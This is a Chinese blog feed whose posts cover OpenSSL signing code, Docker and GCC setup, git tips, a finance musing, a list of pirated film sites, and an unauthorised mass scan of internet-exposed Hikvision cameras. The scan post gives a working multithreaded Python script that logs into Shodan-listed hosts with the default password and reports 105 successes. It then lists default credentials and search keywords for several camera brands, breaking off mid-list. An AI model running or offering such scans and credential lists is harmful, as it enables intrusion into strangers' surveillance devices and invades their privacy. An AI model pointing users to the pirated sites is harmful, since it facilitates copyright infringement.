c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">base64_encode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>* <span class="built_in">buffer</span>, <span class="keyword">size_t</span> length, <span class="keyword">char</span>** b64text)</span> </span>&#123;</span><br><span class="line">    BIO* bio, * b64;</span><br><span class="line">    BUF_MEM* bufferPtr;</span><br><span class="line">    b64 = BIO_new(BIO_f_base64());</span><br><span class="line">    bio = BIO_new(BIO_s_mem());</span><br><span class="line">    bio = BIO_push(b64, bio);</span><br><span class="line">    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);</span><br><span class="line">    BIO_write(bio, <span class="built_in">buffer</span>, length);</span><br><span class="line">    BIO_flush(bio);</span><br><span class="line">    BIO_get_mem_ptr(bio, &amp;bufferPtr);</span><br><span class="line">    BIO_set_close(bio, BIO_NOCLOSE);</span><br><span class="line">    *b64text = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>((bufferPtr-&gt;length + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="built_in">memcpy</span>(*b64text, bufferPtr-&gt;data, bufferPtr-&gt;length);</span><br><span class="line">    (*b64text)[bufferPtr-&gt;length] = <span class="string">'\0'</span>;</span><br><span class="line">    BIO_free_all(bio);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最后通过main函数读入字符串并将三个过程连起来"><a href="#最后通过main函数读入字符串并将三个过程连起来" class="headerlink" title="最后通过main函数读入字符串并将三个过程连起来"></a>最后通过main函数读入字符串并将三个过程连起来</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usage: work.exe \"string to hash and sign\""</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span>* str = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"your str: %s\n"</span>, str);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// first md5(str)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> md[MD5_DIGEST_LENGTH];</span><br><span class="line">    md5_hash(str, md);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// then gen rsa pkey and sign the md</span></span><br><span class="line">    RSA* rsa = gen_rsa();</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>* sig = <span class="keyword">new</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> siglen;</span><br><span class="line">    RSA_sign(NID_sha1, md, MD5_DIGEST_LENGTH, sig, &amp;siglen, rsa);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// final base64(sig)</span></span><br><span class="line">    <span class="keyword">char</span>* b64text;</span><br><span class="line">    base64_encode(sig, (<span class="keyword">size_t</span>)siglen, &amp;b64text);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, b64text);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>因为是课程作业，就没有对出现的错误情况进行处理，实际使用时需要考虑到</p></blockquote><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><h3 id="运行截图"><a href="#运行截图" class="headerlink" title="运行截图"></a>运行截图</h3><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/openssl-first-try-rsa-md5-base64/run1.png" loading="lazy" class="" title="[运行截图]"><h3 id="生成的私钥文件"><a href="#生成的私钥文件" class="headerlink" title="生成的私钥文件"></a>生成的私钥文件</h3><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/openssl-first-try-rsa-md5-base64/key1.png" loading="lazy" class="" title="[私钥]"><h3 id="生成的公钥文件"><a href="#生成的公钥文件" class="headerlink" title="生成的公钥文件"></a>生成的公钥文件</h3><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/openssl-first-try-rsa-md5-base64/key2.png" loading="lazy" class="" title="[公钥]">]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> coding </tag>
            
            <tag> openssl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加速docker pull</title>
      <link href="/2020/speedup-docker-pull.html"/>
      <url>/2020/speedup-docker-pull.html</url>
      
        <content type="html"><![CDATA[<h2 id="为docker设置代理"><a href="#为docker设置代理" class="headerlink" title="为docker设置代理"></a>为docker设置代理</h2><p>环境是在centos下，如果没有新建下面这个文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/systemd/system/docker.service.d</span><br></pre></td></tr></table></figure><p>之后新建下面这个文件走http代理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/systemd/system/docker.service.d/http-proxy.conf</span><br></pre></td></tr></table></figure><p>填入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Environment="HTTP_PROXY=http://192.168.88.10:7890/"</span><br></pre></td></tr></table></figure><p>编辑下面这个文件走https代理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/systemd/system/docker.service.d/https-proxy.conf</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Environment="HTTPS_PROXY=https://proxy.example.com:443/"</span><br></pre></td></tr></table></figure><p>之后你使用docker pull的时候就可以pull gcr.io上的镜像了</p><p><a href="https://juejin.im/post/5cc7b53c51882525124126f1" target="_blank" rel="noopener">https://juejin.im/post/5cc7b53c51882525124126f1</a><br><a href="https://docs.docker.com/config/daemon/systemd" target="_blank" rel="noopener">https://docs.docker.com/config/daemon/systemd</a></p><h2 id="换国内源"><a href="#换国内源" class="headerlink" title="换国内源"></a>换国内源</h2><p>创建或修改 <code>/etc/docker/daemon.json</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'</span><br><span class="line">&#123;</span><br><span class="line">    "registry-mirrors": [</span><br><span class="line">        "https://u8rbddql.mirror.aliyuncs.com",</span><br><span class="line">        "https://docker.mirrors.ustc.edu.cn",</span><br><span class="line">        "https://mirror.ccs.tencentyun.com",</span><br><span class="line">        "https://registry.docker-cn.com"</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p><a href="https://juejin.im/post/5cd2cf01f265da0374189441" target="_blank" rel="noopener">https://juejin.im/post/5cd2cf01f265da0374189441</a></p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> proxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译gcc</title>
      <link href="/2019/gcc-compile.html"/>
      <url>/2019/gcc-compile.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>一直用gcc编译各种东西，第一次研究如何编译gcc<br>这就是一个鸡生蛋与蛋生鸡的问题</p></blockquote><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><p>编译gcc需要gmp、mpfr和mpc，还需要预先有一个已经能用的gcc</p><h3 id="首先安装gmp"><a href="#首先安装gmp" class="headerlink" title="首先安装gmp"></a>首先安装gmp</h3><p>从 <a href="http://ftp.gnu.org/gnu/gmp/" target="_blank" rel="noopener">http://ftp.gnu.org/gnu/gmp/</a> 下载一个符合要求的稳定版本的gmp的源码<br>这里我下载的是 <a href="http://ftp.gnu.org/gnu/gmp/gmp-5.0.1.tar.bz2" target="_blank" rel="noopener">http://ftp.gnu.org/gnu/gmp/gmp-5.0.1.tar.bz2</a></p><p>解压后从源码编译安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar jxf gmp-5.0.1.tar.bz2</span><br><span class="line">cd gmp-5.0.1</span><br><span class="line">sudo ./configure --prefix=/opt/gmp</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h3 id="安装mpfr"><a href="#安装mpfr" class="headerlink" title="安装mpfr"></a>安装mpfr</h3><p>从 <a href="http://ftp.gnu.org/gnu/mpfr/" target="_blank" rel="noopener">http://ftp.gnu.org/gnu/mpfr/</a> 下载一个稳定版本<br>我选择的是 <a href="http://ftp.gnu.org/gnu/mpfr/mpfr-3.1.4.tar.bz2" target="_blank" rel="noopener">http://ftp.gnu.org/gnu/mpfr/mpfr-3.1.4.tar.bz2</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tar jxf mpfr-3.1.4.tar.bz2</span><br><span class="line">cd mpfr-3.1.4</span><br><span class="line">sudo ./configure --prefix=/opt/mpfr \</span><br><span class="line">      --with-gmp-lib=/opt/gmp/lib \</span><br><span class="line">      --with-gmp-include=/opt/gmp/include</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h3 id="安装mpc"><a href="#安装mpc" class="headerlink" title="安装mpc"></a>安装mpc</h3><p>从 <a href="http://ftp.gnu.org/gnu/mpc/mpc-1.0.3.tar.gz" target="_blank" rel="noopener">http://ftp.gnu.org/gnu/mpc/mpc-1.0.3.tar.gz</a> 下载<br>我选择的是<a href="http://ftp.gnu.org/gnu/mpc/mpc-1.0.3.tar.gz" target="_blank" rel="noopener">http://ftp.gnu.org/gnu/mpc/mpc-1.0.3.tar.gz</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar zxf mpc-1.0.3.tar.gz</span><br><span class="line">cd mpc-1.0.3</span><br><span class="line">sudo ./configure --prefix=/opt/mpc \</span><br><span class="line">      --with-gmp-lib=/opt/gmp/lib \</span><br><span class="line">      --with-gmp-include=/opt/gmp/include \</span><br><span class="line">      --with-mpfr-lib=/opt/mpfr/lib \</span><br><span class="line">      --with-mpfr-include=/opt/mpfr/include</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><blockquote><p>上面依赖安装顺序不能错</p></blockquote><p>后来听曹老师说可以用 apt 直接安装，血亏</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libmpc-dev libmpfr-dev libgmp-dev libgmp3-dev</span><br></pre></td></tr></table></figure><blockquote><p>又一个后来，发现 gcc 源码中有脚本可以一键下载安装这些依赖</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh ./contrib/download_prerequisites</span><br></pre></td></tr></table></figure><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>然后进入gcc目录</p><p>配置编译配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./configure \</span><br><span class="line">  --enable-checking=release \</span><br><span class="line">  --enable-languages=c,c++ \</span><br><span class="line">  --disable-multilib</span><br></pre></td></tr></table></figure><p>执行 <code>make -j8</code> 然后去喝功夫茶</p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gcc </tag>
            
            <tag> compile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>盗版影视站</title>
      <link href="/2019/pirated-movie.html"/>
      <url>/2019/pirated-movie.html</url>
      
        <content type="html"><![CDATA[<h3 id="奈菲影视"><a href="#奈菲影视" class="headerlink" title="奈菲影视"></a>奈菲影视</h3><p><a href="https://www.nfmovies.com/" target="_blank" rel="noopener">https://www.nfmovies.com/</a></p><h3 id="团长资源"><a href="#团长资源" class="headerlink" title="团长资源"></a>团长资源</h3><p><a href="https://tzfile.com/" target="_blank" rel="noopener">https://tzfile.com/</a></p><h3 id="低端影视"><a href="#低端影视" class="headerlink" title="低端影视"></a>低端影视</h3><p><a href="http://ddrk.me/" target="_blank" rel="noopener">http://ddrk.me/</a></p><h3 id="人人影视"><a href="#人人影视" class="headerlink" title="人人影视"></a>人人影视</h3><p><a href="http://www.zmz2019.com/" target="_blank" rel="noopener">http://www.zmz2019.com/</a></p><h3 id="远鉴字幕组"><a href="#远鉴字幕组" class="headerlink" title="远鉴字幕组"></a>远鉴字幕组</h3><p><a href="https://yj.apkgm.top/" target="_blank" rel="noopener">https://yj.apkgm.top/</a></p><h3 id="tg帮找资源频道"><a href="#tg帮找资源频道" class="headerlink" title="tg帮找资源频道"></a>tg帮找资源频道</h3><p><a href="https://t.me/s/lovesource" target="_blank" rel="noopener">https://t.me/s/lovesource</a></p><p><a href="https://www.netflixstar.top/" target="_blank" rel="noopener">https://www.netflixstar.top/</a></p><p><a href="https://1090ys.com/" target="_blank" rel="noopener">https://1090ys.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> share </category>
          
      </categories>
      
      
        <tags>
            
            <tag> movie </tag>
            
            <tag> pirated </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>资本、金融、经济</title>
      <link href="/2019/thinking-12-16.html"/>
      <url>/2019/thinking-12-16.html</url>
      
        <content type="html"><![CDATA[<p>去年的某个周末，我偶然在腾讯视频看到了一部连续短剧《东方华尔街》，刚看第一集就被深深吸引住了。《东方华尔街》讲述的是一队隐于世的金融雇佣兵，狙击政经界传奇人物，并搅动整个金融市场的复仇故事。故事吸引我的不仅仅是故事中的师徒情谊、恩怨之争、社会责任，更有整个连续短剧中贯穿的金融内容。这队人通过金融、传媒、政治等各方面手段操纵整个金融市场，继而决定整个金融社会的走势，这让我对金融相关知识愈发感兴趣起来。</p><p>在看完这个连续短剧之后，我又去学校图书馆查找相关书籍，书架上书太多了，太专业的看不懂，自己还是对金融相关发展历史和故事比较感兴趣，所以最终决定看《货币战争》。<br>后续因为期末考试书没有看完，这段故事就告一段落。</p><p>这段时间，正在kindle上阅读刚下载的几本书《坏血：一个硅谷巨头的秘密与谎言》、《金钱永不眠：资本世界的暗流涌动和金融逻辑》，书还没看完，但却勾起了我对金融学、经济学等相关知识更加深入了解的念头。</p><p>这段时间是期末考试月，越到考试月，这个人在无聊的情况下想的事情越多，加上今年发生的种种事情、各种乱七八糟颠覆我世界观的新闻，我对一些事物的概念越发模糊起来。</p><p>什么是国家？</p><p>什么是政治？</p><p>什么是社会？</p><p>什么是经济？</p><p>什么是金融？</p><p>什么是资本？</p><p>等等。。。。。</p><p>这些概念最初接触应该是初高中的政治课上，但是学习的也不够深入，或者说学的东西太模糊了，感觉跟现实世界的一些东西有些偏差，在生活中越发发现有些东西是需要自己去体悟自己去领会的。</p><p>一个人的世界观、金钱观、人生观、、、等等各种观，我们从小接受的教育，都是正确的吗？或者说没有什么正确的东西，只有适合这个时代、适合这个社会、适合当前的一些东西。</p><p>自己出生于农村家庭，也没有去过国外，就连出省也仅有两次，对这个世界的认识还是太浅了。在网络上看到一些事情，在一些平台上看到国外从未了解过的国家的一些事情，发现自己从小到大所受的教育有很多东西已经不适合这个时代了，也不能说过时，感觉上就是太理想化了，或者说之前想的太简单了，很多事情不能说“不是这样”，而是“并不仅仅是我想的这样”。</p><p>好啦，不说了，貌似跑题了，也没关系啦，拜拜，读到这里的陌生人。</p><p>挖坑</p><p>假期要看的连续剧</p><p>《富翁》、《亿万》</p><p>电影<br>《华尔街》</p><p>《华尔街2：金钱永不眠》</p><blockquote><p>迁移丢失的评论：<br>Scarlett 2020年3月1日 上午1:06<br>货币战争并不建议阅读，一个小技巧是阅读前先看豆瓣的评分书评。另外推荐书《灭火》《聪明的投资者》《随机漫步的傻瓜》《投资学精要》《金融学》《漫步华尔街》《伟大的博弈》《战胜华尔街》《逆向思考的艺术》《格雷厄姆投资指南》《投资最重要的事》</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> thinking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些我刚学到的GIT技巧</title>
      <link href="/2019/some-git-skills.html"/>
      <url>/2019/some-git-skills.html</url>
      
        <content type="html"><![CDATA[<h3 id="git-reflog"><a href="#git-reflog" class="headerlink" title="git reflog"></a>git reflog</h3><p>git reflog 可以查看所有分支的所有操作记录（包括（包括commit和reset的操作），包括已经被删除的commit记录，git log则不能察看已经删除了的commit记录，而且跟进结果可以回退道某一个修改</p><p>有时候想要删除reflog记录，可以使用下面的命令</p><p>首先确保所有分支都没有引用该提交，包括HEAD也不指向这个提交。</p><p>然后 git reflog expire –expire=now –all (这会清除分支变更历史)</p><p>然后 git gc –prune=now (不用调整时间，加上–prune=now命令即可)</p><h3 id="git-rebase"><a href="#git-rebase" class="headerlink" title="git rebase"></a>git rebase</h3><p>参考文章：<a href="http://jartto.wang/2018/12/11/git-rebase/" target="_blank" rel="noopener">http://jartto.wang/2018/12/11/git-rebase/</a></p><p>可以合并多次提交记录: git rebase -i HEAD~4</p><p>可以合并分支而不产生merge记录</p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>针对海康威视网络摄像头弱密码的一次扫描</title>
      <link href="/2019/scan-hikvision-weak-password.html"/>
      <url>/2019/scan-hikvision-weak-password.html</url>
      
        <content type="html"><![CDATA[<p>在我上高二的时候，海康威视摄像头被爆出大量公开web访问具有弱密码，那时手动对学校内部的摄像头进行fuzz，成功进入了几个摄像头控制web，能够随意查看学校的监控。</p><p>海康威视web界面的弱密码是 admin  12345</p><p>时隔四年，想要再次对网络上能够访问到的海康威视web管理进行一次批量弱密码扫描。</p><p>首先需要搞到全网所有能够访问到的海康威视机器的IP，这是个工作量极大的任务，如果自己进行全网服务扫描的话无论是时间周期还是耗费资金都是我无法承受的。</p><p>之前了解过shodan，shodan被称为“最恐怖的搜索引擎”，能够提供多年来其扫描到的全网提供的服务，可惜数据的价格极高。</p><p>今年黑五是shodan诞生第十年，shodan给出极大的优惠，正式会员+20credit只需要1刀，手头有信用卡和企业邮箱的我二话不说先上了20个账号。</p><p>有了shodan的credit就可以购买它的数据了。海康威视的web管理界面的关键词很简单，只需要在shodan搜索“hikvision”。</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2019/scan-hikvision-weak-password/shodan1.png" loading="lazy" class="" title="[最新的搜索结果]"><p>在我写这篇博客的时候搜索到的数据有18万条，前段时间我下载数据的时候是19万条。</p><p>下载大量数据是需要花credit的，1credit可以下载1万条数据，所以19万多的数据花费了我20credit，正常情况下20credit是49刀，这次黑五真是太实惠了。</p><p>有了数据之后通过python解析，检查是否存在http服务，如果存在就提取ip和port。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">fi = open(<span class="string">"shodan_data.json"</span>)</span><br><span class="line">fo = open(<span class="string">"ip.txt"</span>, <span class="string">'w'</span>)</span><br><span class="line"></span><br><span class="line">line = fi.readline()</span><br><span class="line">numall = <span class="number">1</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> line:</span><br><span class="line">    line = fi.readline()</span><br><span class="line">    numall = numall+<span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = json.loads(line)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">in</span> a:</span><br><span class="line">            num = num+<span class="number">1</span></span><br><span class="line">            txt = a[<span class="string">'http'</span>][<span class="string">'host'</span>]+<span class="string">':'</span>+str(a[<span class="string">'port'</span>])+<span class="string">'\n'</span></span><br><span class="line">            fo.write(txt)</span><br><span class="line">            print(txt)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">fo.close()</span><br><span class="line">fi.close()</span><br><span class="line"></span><br><span class="line">print(numall)</span><br><span class="line">print(num)</span><br></pre></td></tr></table></figure><p>然后通过多线程python脚本进行弱密码批量扫描。</p><p>通过手工尝试找到一台可以弱密码登录进去的机器，通过burp抓包分析，找到用来验证弱密码的接口。</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2019/scan-hikvision-weak-password/baseauth.png" loading="lazy" class="" title="[登录使用的接口和验证方式]"><p>分析发现登录使用的是base auth，这就简单了。使用的接口是userCheck，如果登录成功应该返回200.</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2019/scan-hikvision-weak-password/authsuccess.png" loading="lazy" class="" title="[登录成功]"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#批量筛选海康威视摄像头的弱密码</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Threads</span><span class="params">()</span>:</span></span><br><span class="line">    threadlist=[]</span><br><span class="line">    myqueue=queue.Queue()</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> open(<span class="string">'ip.txt'</span>,<span class="string">'r'</span>): <span class="comment">#扫描出的ip</span></span><br><span class="line">        myqueue.put(ip.replace(<span class="string">'\n'</span>,<span class="string">''</span>))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):  <span class="comment">#线程数</span></span><br><span class="line">        th=threading.Thread(target=scan_Hikvision,args=(myqueue,))</span><br><span class="line">        threadlist.append(th)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threadlist:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threadlist:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_Hikvision</span><span class="params">(myqueue)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> myqueue.empty():</span><br><span class="line">        ip=myqueue.get()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(<span class="string">"[*]scan:"</span>+ip)</span><br><span class="line">            r = requests.get(url=(<span class="string">"http://%s/PSIA/Custom/HIK/userCheck"</span> % ip),auth=(<span class="string">'admin'</span>,<span class="string">'12345'</span>),timeout=<span class="number">10</span>)</span><br><span class="line">            status = re.findall(<span class="string">r'&lt;statusValue&gt;(.*)&lt;/statusValue&gt;'</span>, r.text)</span><br><span class="line">            <span class="keyword">if</span> status[<span class="number">0</span>] == <span class="string">'200'</span>:</span><br><span class="line">                print(<span class="string">'[√] Host http://'</span>+ ip +<span class="string">' Login Success!\n'</span>)</span><br><span class="line">                f = open(<span class="string">'ok.txt'</span>, <span class="string">'a+'</span>)</span><br><span class="line">                f.write(ip+<span class="string">"\n"</span>)</span><br><span class="line">                f.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    Threads()</span><br></pre></td></tr></table></figure><p>正好有个美国的vps，就扔到这个服务器上进行扫描，本机也开起来扫。</p><p>100线程很快就扫描完毕了，国内外扫描完的结果去重后一共留下105个可登录弱密码。感觉不应该只有这么点，登录后查看只发现一个版本的海康威视，可能是检测弱密码的接口在其他版本中不存在，或者其他版本默认密码更换或者其他原因。</p><p>海康威视应该是采取了手段来避免弱密码的再次产生，但是之前老版本的DVR还有一部分并没有进行更新，大部分是农村的家庭或工厂监控，大家也都不太懂，并没有修改默认密码。</p><p>心里不是滋味，身边也有一些父母的朋友他们让我帮忙安装一些路由器、监控等设备，他们的文化水平不高，当我要给他们修改密码的时候，一部分会选择手机号码，也有一部分让我不要修改密码，说改了别记不住，直接出厂密码就行了，忘了可以看一下说明书。</p><p>能不能想出一种办法，既考虑到安全性，又能顾虑到这部分人的需求，这是个问题。</p><h2 id="摄像头弱密码收集"><a href="#摄像头弱密码收集" class="headerlink" title="摄像头弱密码收集"></a>摄像头弱密码收集</h2><p>1.海康威视IP网络摄像机：</p><p>用户：admin，密码：12345</p><p>zoomeye搜索关键词：hikvision</p><p>2.大华网络摄像机：</p><p>user:admin pass:admin 管理权限</p><p>user:default pass:user 用户默认登陆帐号</p><p>user:888888 pass:admin</p><p>user:666666 pass:user</p><p>zoomeye搜索关键词：WEB SERVICE</p><p>3.cctv摄像机：</p><p>user：admin pass：空</p><p>telnet登陆 user：root pass：”juantech”</p><p>zoomeye搜索关键词：JAWS/1.0</p><p>4.SQ-WEBCAM摄像机：</p><p>user：admin pass：admin</p><p>zoomeye搜索关键词：SQ-WEBCAM</p><p>ACTi: admin/123456 or Admin/123456</p><p>American Dynamics: admin/admin or 